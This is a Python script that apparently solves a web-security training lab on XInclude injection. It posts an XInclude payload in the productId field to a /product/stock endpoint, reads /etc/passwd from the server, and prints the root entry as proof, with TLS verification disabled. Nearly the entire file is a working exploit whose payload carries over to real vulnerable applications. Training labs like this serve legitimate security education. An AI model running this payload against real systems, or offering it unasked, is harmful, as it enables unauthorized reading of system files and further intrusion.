import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting XInclude to retrieve files"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Using XInclude specification to retrieve the content of /etc/passwd\n2. Extract the first line as a proof\n""")

    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "productId")

    print(Fore.WHITE +
          "[1] Using XInclude specification to retrieve the content of /etc/passwd")

    payload = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
            <xi:include parse="text" href="file:///etc/passwd"/>
            </foo>"""
    data = {"productId": payload, "storeId": "1"}

    try:
        r = requests.post(
            f"{url}/product/stock", data=data, verify=False, proxies=proxies)
        print(Fore.WHITE + "[2] Extracting the first line as a proof")
        first_line = re.findall("/(root:.*)\n", r.text)[0]
        print(Fore.GREEN + "[+] first line" +
              Fore.WHITE + " => " + Fore.YELLOW + first_line)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
